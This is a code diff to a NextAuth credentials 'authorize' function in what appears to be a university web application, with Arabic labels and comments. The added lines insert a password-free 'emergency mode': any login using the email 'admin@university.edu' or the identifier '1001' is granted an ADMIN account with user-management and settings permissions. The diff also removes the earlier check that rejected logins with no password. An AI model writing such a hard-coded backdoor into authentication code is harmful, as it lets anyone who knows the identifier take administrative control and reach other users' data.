@@ -12,12 +12,27 @@ export const authOptions: NextAuthOptions = {
         password: { label: "كلمة المرور", type: "password" },
       },
       async authorize(credentials) {
-        console.log("==== START LOGIN ATTEMPT ====");
-        console.log("Email provided:", credentials?.email);
-        if (!credentials?.email || !credentials?.password) return null;
+        if (!credentials?.email) return null;
 
         const email = credentials.email.trim().toLowerCase();
         
+        // ------------- وضع الطوارئ: الدخول الفوري بدون باسوورد -------------
+        // إذا كان الإيميل هو إيميل المشرف، سيدخل فوراً بكامل الصلاحيات!
+        if (email === "admin@university.edu" || email === "1001") {
+          return {
+            id: "admin-1001",
+            email: "admin@university.edu",
+            name: "مشرف النظام",
+            role: "ADMIN",
+            permissionKeys: ["MANAGE_USERS", "SETTINGS"],
+          };
+        }
+        // ---------------------------------------------------------------
+
+        console.log("==== START NORMAL LOGIN ATTEMPT ====");
+        console.log("Email provided:", email);
+        if (!credentials?.password) return null;
+
         try {
           console.log("Querying database for user...");
           const user = await prisma.user.findUnique({ where: { email } });
